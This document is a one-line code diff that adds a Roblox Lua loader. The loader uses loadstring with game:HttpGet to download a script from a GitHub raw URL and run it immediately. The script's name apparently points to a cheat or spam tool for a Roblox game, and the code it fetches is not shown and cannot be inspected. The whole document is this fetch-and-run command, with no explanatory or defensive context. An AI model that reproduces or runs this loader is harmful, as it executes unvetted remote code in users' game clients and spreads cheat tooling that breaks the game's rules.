@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/catch-the-artist-spam6-l3drmudrl1fj1k.lua"))()
